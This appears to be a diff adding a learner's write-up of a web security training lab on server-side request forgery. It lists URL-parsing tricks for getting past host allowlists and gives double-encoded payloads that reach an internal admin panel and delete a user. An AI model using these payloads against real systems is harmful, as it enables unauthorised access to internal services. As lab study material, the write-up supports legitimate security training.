@@ -1,0 +1,48 @@
+Some applications only allow input that matches, begins with, or contains, a whitelist of permitted values. In this situation, you can sometimes circumvent the filter by exploiting inconsistencies in URL parsing.
+
+The URL specification contains a number of features that are liable to be overlooked when implementing ad hoc parsing and validation of URLs
+
+You can embed credentials in a URL before the hostname, using the @ character. For example:
+
+https://expected-host@evil-host
+You can use the # character to indicate a URL fragment. For example:
+
+https://evil-host#expected-host
+You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example:
+
+https://expected-host.evil-host
+You can URL-encode characters to confuse the URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request.
+You can use combinations of these techniques together.
+
+Goal:
+This lab has a stock check feature which fetches data from an internal system.
+
+To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.
+
+The developer has deployed an anti-SSRF defense you will need to bypass.
+
+
+stockapi=http://localhost/
+
+It looks like theyre validating this against a allowlist. Has to equal hostname stock.weliketoshop.net
+
+Tried it with the 
+stockApi=http://username#@stock.weliketoshop.net
+
+Parser that this app is using is parsing the http:// part then anything after is a url and after # is a bookmark/reference to element in the page.
+
+You will get another error by url encoding it twice aka
+stockApi=http://username%2523@stock.weliketoshop.net
+indicates that we are working in the correct direction.
+
+Replace username with localhost
+stockApi=http://localhost%2523@stock.weliketoshop.net
+
+We get a 200 response and see that its admin panel is available
+
+Try to access admin panel
+stockApi=http://localhost%2523@stock.weliketoshop.net/admin
+
+finally stockApi=http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos
+
+
